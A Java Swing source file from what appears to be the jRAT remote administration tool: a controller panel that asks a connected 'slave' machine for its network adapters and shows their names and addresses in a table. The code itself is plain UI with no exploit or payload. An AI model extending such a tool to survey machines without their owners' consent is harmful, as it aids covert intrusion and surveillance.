package jrat.controller.ui.panels;

import jrat.api.Resources;
import jrat.controller.Slave;
import jrat.controller.packets.outgoing.Packet82NetworkAdapters;
import jrat.controller.ui.DefaultJTable;
import jrat.controller.ui.components.TableModel;

import javax.swing.*;
import javax.swing.GroupLayout.Alignment;
import javax.swing.LayoutStyle.ComponentPlacement;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;


@SuppressWarnings("serial")
public class PanelControlAdapters extends PanelControlParent {

    private TableModel model;

	public TableModel getModel() {
		return model;
	}

	public PanelControlAdapters(Slave sl) {
		super(sl);

		JScrollPane scrollPane = new JScrollPane();
		scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);

		JButton btnReloadList = new JButton("Reload list");
		btnReloadList.setIcon(Resources.getIcon("cpu"));
		btnReloadList.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				clear();
				slave.addToSendQueue(new Packet82NetworkAdapters());
			}
		});

		JButton btnClear = new JButton("Clear");
		btnClear.setIcon(Resources.getIcon("clear"));
		btnClear.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				clear();
			}
		});
		GroupLayout groupLayout = new GroupLayout(this);
		groupLayout.setHorizontalGroup(
			groupLayout.createParallelGroup(Alignment.LEADING)
				.addGroup(groupLayout.createSequentialGroup()
					.addContainerGap()
					.addComponent(btnReloadList)
					.addPreferredGap(ComponentPlacement.RELATED)
					.addComponent(btnClear)
					.addContainerGap(406, Short.MAX_VALUE))
				.addComponent(scrollPane, GroupLayout.DEFAULT_SIZE, 600, Short.MAX_VALUE)
		);
		groupLayout.setVerticalGroup(
			groupLayout.createParallelGroup(Alignment.LEADING)
				.addGroup(groupLayout.createSequentialGroup()
					.addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 302, GroupLayout.PREFERRED_SIZE)
					.addPreferredGap(ComponentPlacement.RELATED)
					.addGroup(groupLayout.createParallelGroup(Alignment.LEADING)
						.addComponent(btnClear)
						.addComponent(btnReloadList))
					.addContainerGap(17, Short.MAX_VALUE))
		);

        JTable table = new DefaultJTable();
		table.setModel(model = new TableModel(new Object[][] {}, new String[] { "Display name", "Name", "InetAddresses" }));
		table.setRowHeight(25);
		table.getColumnModel().getColumn(0).setPreferredWidth(176);
		table.getColumnModel().getColumn(1).setPreferredWidth(150);
		table.getColumnModel().getColumn(2).setPreferredWidth(254);
		scrollPane.setViewportView(table);
		setLayout(groupLayout);
	}

	public void clear() {
		while (model.getRowCount() > 0) {
			model.removeRow(0);
		}
	}
}
